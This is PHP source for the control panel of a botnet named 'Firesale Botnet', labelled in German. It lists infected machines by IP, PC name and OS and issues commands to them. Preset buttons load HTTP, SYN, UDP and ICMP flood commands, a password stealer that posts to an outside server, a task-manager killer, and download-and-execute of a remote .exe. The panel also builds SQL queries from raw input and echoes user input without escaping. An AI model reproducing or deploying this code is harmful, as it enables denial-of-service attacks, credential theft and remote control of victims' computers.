<?php
include("sc_checklogin.php");


require "includes/config.php";
  mysql_connect("$servername", "$dbuser","$dbpass") or die
    ("Keine Verbindung moeglich");
  mysql_select_db("$database") or die
    ("Die Datenbank existiert nicht.");

$idcountoffline = "SELECT COUNT(*) AS zaehleroff FROM $table WHERE status = '0'";
$idcountoutputoffline = mysql_fetch_assoc(mysql_query($idcountoffline));

$idcountonline = "SELECT COUNT(*) AS zaehleron FROM $table WHERE status = '1'";
$idcountoutputonline = mysql_fetch_assoc(mysql_query($idcountonline));

$countdead = "SELECT COUNT(*) AS zaehlerdead FROM $table WHERE dead = '1'";
$countoutputdead = mysql_fetch_assoc(mysql_query($countdead));

$countall = "SELECT COUNT(*) AS zahlerall FROM $table";
$countalloutput = mysql_fetch_assoc(mysql_query($countall));

$zahl = $idcountoutputonline['zaehleron'];
$gesamt = $countalloutput['zahlerall'];
if($zahl == "0"){
$totalr = "0";
}else{
$total = $zahl/$gesamt*100;
$totalr = round($total, 2); }

$zahl2 = $idcountoutputoffline['zaehleroff'];
$gesamt2 = $countalloutput['zahlerall'];
if($zahl2 == "0"){
$total2r = "0";
}else{
$total2 = $zahl2/$gesamt2*100;
$total2r = round($total2, 2); }

$zahl3 = $countoutputdead['zaehlerdead'];
$gesamt3 = $countalloutput['zahlerall'];
$total3 = $zahl3/$gesamt3*100;
$total3r = round($total3, 2);

$zahl4 = $countalloutput['zahlerall'];
$gesamt4 = $countalloutput['zahlerall'];
$total4 = $zahl4/$gesamt4*100;
$total4r = round($total4, 2);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" type="text/css" href="css/firestyle.css"/>
<title>Firesale Botnet</title>
</head>
<body>
<div id="panel" align="center">
<a href="<?php echo $_SERVER['PHP_SELF']; ?>"><img src="images/head.png" align="top" alt="FiresaleBotnet" border="0" /></a>
<br />
<div id="sidebar-l">
<table border="0" width="100%">
	<tr height="16">
    	<td width="16"><img src="images/stats.png" /></td>
        <td colspan="3"><b>Statistik</b></td>
    </tr>
    <tr>
    	<td class="nobd"></td>
        <td width="16"><img src="images/on.png" border="0" /></td>
        <td>Bots Online</td>
        <td><?php echo $idcountoutputonline['zaehleron']; ?> (<?php echo "$totalr %"; ?>)</td>
    </tr>
    <tr>
    	<td class="nobd"></td>
        <td width="16"><img src="images/off.png" border="0" /></td>
        <td>Bots Offline</td>
        <td><?php echo $idcountoutputoffline['zaehleroff']; ?> (<?php echo "$total2r %"; ?>)</td>
    </tr>
    <tr>
    	<td class="nobd"></td>
        <td width="16"><img src="images/dead.png" border="0" /></td>
        <td>Bots tot</td>
        <td><?php echo $countoutputdead['zaehlerdead']; ?> (<?php echo "$total3r %"; ?>)</td>
    </tr>
    <tr>
    	<td class="nobd"></td>
        <td width="16"><img src="images/all.png" border="0" /></td>
        <td>Bots gesamt</td>
        <td><?php echo $countalloutput['zahlerall']; ?> (<?php echo "$total4r %"; ?>)</td>
    </tr>
    <tr>
    	<td class="nobd"></td>
        <td colspan="3" align="center">
        <input type="button" style="width:100%;" onclick="javascript:document.location = 'index.php?onlinebotssend=1'" value="Online Bots anzeigen" />
        </td>
    </tr>
    <tr>
    	<td class="nobd"></td>
        <td colspan="3" align="center">
        <input type="button" style="width:100%;" onclick="javascript:document.location = 'index.php'" value="Alle Bots anzeigen" />
        </td>
    </tr>
</table>
</div>
<div id="sidebar-r">
<table width="100%">
	<tr>
    	<td width="16"><img src="images/send.png" /></td>
    	<td colspan="2"><b>CMD Befehl</b></td>
    </tr>
    <form action="<?php $_SERVER['PHP_SELF'] ?>" method="get">
    <tr>
    	<td width="16" class="nobd"></td>
        <td>
            <input type="text" name="command" id="cmd">
        </td>
        <td>
  			<input type="submit" name="send" value="Ausf&uuml;hren">
  			
        </td>
    </tr>
    </form>

    <tr>
    	<td width="16"><img src="images/send.png" /></td>
        <td colspan="2"><b>Befehle</b> (Push to Paste)</td>
    </tr>
    <tr>
   		<td class="nobd"></td>
  			<td colspan="2">
  				<input type="button" style="width:100%;" onclick="javascript:document.getElementById('cmd').value = '{http} http://www.floodingpage.de/ 10'" value="HTTP Flood" />
     </td>
	 <tr>
   		<td class="nobd"></td>
  			<td colspan="2">
  				<input type="button" style="width:100%;" onclick="javascript:document.getElementById('cmd').value = '{syn} www.floodingpage.de 80 10'" value="SYN Flood" />
     </td>
	 <tr>
   		<td class="nobd"></td>
  			<td colspan="2">
  				<input type="button" style="width:100%;" onclick="javascript:document.getElementById('cmd').value = '{udp} 127.0.0.1 80 10 1000'" value="UDP Flood" />
     </td>
	 <tr>
	    <td class="nobd"></td>
  			<td colspan="2">
  				<input type="button" style="width:100%;" onclick="javascript:document.getElementById('cmd').value = '{icmp} 127.0.0.1 5 2000 100'" value="ICMP Flood" />
     </td>
	 <tr>
	 	<td class="nobd"></td>
  			<td colspan="2">
  				<input type="button" style="width:100%;" onclick="javascript:document.getElementById('cmd').value = '{socks5}'" value="Socks5" />
     </td>
	 <tr>
	 	<td class="nobd"></td>
  			<td colspan="2">
  				<input type="button" style="width:100%;" onclick="javascript:document.getElementById('cmd').value = '{stealer} http://www.deinserver.com/stealer/send.php'" value="Pass. Stealer" />
     </td>
	 <tr>
        		<td class="nobd"></td>
            <td colspan="2">
  				<input type="button" style="width:100%;" onclick="javascript:document.getElementById('cmd').value = '{kill} taskmgr'" value="Prozess Killer" />
     </td>
	 <tr>
        		<td class="nobd"></td>
            <td colspan="2">
  				<input type="button" style="width:100%;" onclick="javascript:document.getElementById('cmd').value = '{visit} http://www.google.de/'" value="Webseite &ouml;ffnen" />
     </td>
	 <tr>
        		<td class="nobd"></td>
            <td colspan="2">
  				<input type="button" style="width:100%;" onclick="javascript:document.getElementById('cmd').value = '{dl} http://www.deinserver.com/serv.exe'" value="Download &amp; Execute" />
     </tr>
	 <tr>
        		<td class="nobd"></td>
            <td colspan="2">
  				<input type="button" style="width:100%;" onclick="javascript:document.getElementById('cmd').value = '{stop}'" value="Bot / Flood stoppen" />
     </td>
 
</table>
</div>
<div id="main">
<?php
if (isset($_GET["send"])){
if($_GET["command"] == ""){
echo '<br /><div align="center"><b><font color="red">Kein Befehl eingegeben!</font></b></div>';
}else{
$datei_handle=fopen("command.txt",w);
fwrite($datei_handle,$_GET["command"]);
fclose($datei_handle);
$command = $_GET["command"];
mysql_query("DELETE FROM command WHERE id = '1'");
mysql_query("INSERT INTO command (id,command) VALUES ('1','$command')");
echo '<br /><div align="center"><b><font color="green">Erfolgreich ausgef&uuml;hrt!</font></b></div>';
}
}
?>
<table width="100%">
<tr>
	<td width="16"><img src="images/bots.png"  /></td>
    <td colspan="6"><?php if (isset($_GET['command'])) { echo $_GET['command']; } else { readfile ('command.txt'); } ?></td>
</tr>
<tr>
	<td class="nobd" width="16"></td>
    <td class="nobd"></td>
    <td>ID</td>
    <td>IP</td>
	<td>Name</td>
	
    <td>System</td>
    <td>Status</td>
</tr>
<?php
$abfrage = "SELECT * FROM $table ORDER BY id";
$ergebnis = mysql_query($abfrage); 

while($row = mysql_fetch_object($ergebnis))
   {
   ?>
<tr>
<?php if($row->status == "1"){?>
<td width="16"><img src="images/on.png"></td>
<td width="16" valign="middle">
<?php if ($row->country == "") { ?>
<img src="images/flaggen/unbekannt.gif">
<?php	
} else  { ?>
<img src="images/flaggen/<?php echo $row->country ?>.gif">
<?php } ?>
</td> 
<td><?php echo $row->id ?></td>
<td><?php echo $row->ip ?></td>
<td><?php echo $row->pcname ?></td>

<td><?php echo $row->os ?></td>
<td><?php echo $row->answer ?></td>
<?php }elseif(isset($_GET['onlinebotssend'])){

}else{?>
<td width="16"><img src="images/off.png"></td>
<td width="16" valign="middle">
<?php if ($row->country == "") { ?>
<img src="images/flaggen/unbekannt.gif">
<?php	
} else  { ?>
<img src="images/flaggen/<?php echo $row->country ?>.gif">
<?php } ?>
</td> 
<td><?php echo $row->id ?></td>
<td><?php echo $row->ip ?></td>
<td><?php echo $row->pcname ?></td>
<td><?php echo $row->os ?></td> 
<td><?php echo $row->answer ?></td>
<?php
}
?>
</tr>
   <?php
    if ($row->time < time()-$timer) {
    $id = $row->id;
    mysql_query("UPDATE $table Set status = '0' WHERE id = '$id'");
    }
    if ($row->time < time()-$dead) {
    $id = $row->id;
    mysql_query("UPDATE $table Set dead = '1' WHERE id = '$id'");
    mysql_query("UPDATE $table Set status = '3' WHERE status = '0'");
    }
   }
?>
</table>
</div>
<br clear="all" />
<div style="clear:both">
<span style="font-size:10px;">Firesale Botnet code by <a href="http://Anatoxis.6x.to/">Anatoxis</a></a></span>
</div>
</div>
</body>
</html>